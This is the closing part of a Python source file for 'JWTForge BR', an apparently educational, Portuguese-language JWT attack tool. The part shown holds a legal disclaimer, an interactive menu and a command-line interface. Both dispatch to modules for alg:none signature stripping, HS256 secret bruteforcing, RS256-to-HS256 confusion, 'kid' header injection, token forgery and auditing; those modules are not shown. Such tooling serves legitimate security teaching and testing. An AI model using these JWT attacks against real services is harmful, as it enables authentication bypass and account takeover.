  Ferramenta criada exclusivamente para fins {RESET}{YELLOW}educacionais{DIM} e para
  testes em sistemas {RESET}{YELLOW}próprios{DIM} ou com {RESET}{YELLOW}autorização por escrito{DIM}.

  Uso não autorizado contra terceiros é {RESET}{RED}crime{DIM} no Brasil —
  {RESET}{RED}Lei 12.737/2012{DIM} (Carolina Dieckmann) e {RESET}{RED}LGPD (13.709/2018){DIM}.
  O autor e o CyberGuard Academy não se responsabilizam pelo uso indevido.{RESET}
""")
    ler(f"{GREEN}[ENTER para confirmar que você entendeu e concorda]{RESET}")


def mostrar_menu(token_atual):
    W = 52
    print(f"{GREEN}╔{'═' * W}╗{RESET}")
    print(f"{GREEN}║{RESET}{BRIGHT}{'MENU PRINCIPAL'.center(W)}{RESET}{GREEN}║{RESET}")
    print(f"{GREEN}╠{'═' * W}╣{RESET}")
    itens = [
        ("1", "Decodificar e inspecionar token"),
        ("2", "Ataque alg:none (remover assinatura)"),
        ("3", "Bruteforce de secret (HS256)"),
        ("4", "Confusão de algoritmo (RS256 → HS256)"),
        ("5", "Injeção no header 'kid'"),
        ("6", "Forjar token (com secret conhecida)"),
        ("7", "Auditoria completa do token"),
        ("8", "Carregar / trocar token atual"),
        ("0", "Sair"),
    ]
    for num, txt in itens:
        linha = f"  [{num}] {txt}"
        print(f"{GREEN}║{RESET}{CYAN}{linha.ljust(W)}{RESET}{GREEN}║{RESET}")
    print(f"{GREEN}╚{'═' * W}╝{RESET}")

    if token_atual:
        prev = (token_atual[:30] + "…") if len(token_atual) > 30 else token_atual
        print(f"  {DIM}Token atual:{RESET} {GREEN}{prev}{RESET}")
    else:
        print(f"  {DIM}Token atual: nenhum{RESET}")


def garantir_token(token_atual):
    if token_atual:
        return token_atual
    warn("Nenhum token carregado. Carregue um agora:")
    pausa()
    return modulo_carregar()


def menu_interativo():
    limpar()
    banner()
    aviso_legal_confirmar()
    token_atual = None

    while True:
        limpar()
        banner()
        mostrar_menu(token_atual)
        op = ler(f"\n{GREEN}[>]{RESET} Escolha uma opção: ").strip()

        if op == "1":
            token_atual = garantir_token(token_atual)
            if token_atual:
                modulo_inspecionar(token_atual)
                pausa()

        elif op == "2":
            token_atual = garantir_token(token_atual)
            if token_atual:
                modulo_alg_none(token_atual)
                pausa()

        elif op == "3":
            token_atual = garantir_token(token_atual)
            if token_atual:
                modulo_bruteforce(token_atual)
                pausa()

        elif op == "4":
            token_atual = garantir_token(token_atual)
            if token_atual:
                modulo_confusao(token_atual)
                pausa()

        elif op == "5":
            token_atual = garantir_token(token_atual)
            if token_atual:
                modulo_kid(token_atual)
                pausa()

        elif op == "6":
            # Forja pode partir do zero, não exige token carregado.
            modulo_forjar(token_atual)
            pausa()

        elif op == "7":
            token_atual = garantir_token(token_atual)
            if token_atual:
                modulo_auditoria(token_atual)
                pausa()

        elif op == "8":
            novo = modulo_carregar()
            if novo:
                token_atual = novo
            pausa()

        elif op in ("0", "q", "sair", "exit"):
            sair()

        else:
            warn("Opção inválida.")
            pausa()


# ============================================================================
#  CLI (argparse) — atalhos sem menu. Sem argumentos, abre o menu.
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        prog="jwtforge_br.py",
        description="JWTForge BR v1.0 — exploração educacional de JWT "
                    "(CyberGuard Academy).",
        epilog="Sem argumentos, abre o menu interativo. "
               "Uso educacional e autorizado apenas.",
    )
    parser.add_argument("--decode", metavar="TOKEN",
                        help="Decodifica e inspeciona um token JWT.")
    parser.add_argument("--crack", metavar="TOKEN",
                        help="Bruteforce da secret HS256 de um token.")
    parser.add_argument("--wordlist", metavar="ARQ",
                        help="Wordlist para o --crack (padrão: lista embutida).")
    parser.add_argument("--none", metavar="TOKEN", dest="none_token",
                        help="Gera variações alg:none do token (sem editar).")
    parser.add_argument("--audit", metavar="TOKEN",
                        help="Auditoria completa do token.")
    parser.add_argument("--demo", action="store_true",
                        help="Imprime um token de demonstração e sai.")
    args = parser.parse_args()

    try:
        if args.demo:
            print(gerar_token_demo())
            return

        if args.decode:
            banner()
            inspecionar_token(args.decode)
            return

        if args.crack:
            banner()
            info("Bruteforce em andamento...\n")
            secret = bruteforce_secret(args.crack, args.wordlist)
            print()
            if secret is not None:
                ok(f"Secret encontrada: {secret!r}")
            else:
                warn("Secret não encontrada.")
            return

        if args.none_token:
            banner()
            try:
                payload = decode_payload(args.none_token)
            except Exception as e:
                erro(f"Token inválido: {e}")
                return
            print(f"{BRIGHT}Variações alg:none:{RESET}")
            for alg, tok in gerar_tokens_none(payload):
                print(f"\n  {CYAN}alg = {alg}{RESET}")
                print(f"  {GREEN}{tok}{RESET}")
            return

        if args.audit:
            banner()
            imprimir_relatorio(auditar_token(args.audit))
            return

        # Nenhum argumento → menu interativo.
        menu_interativo()

    except KeyboardInterrupt:
        sair()


if __name__ == "__main__":
    main()
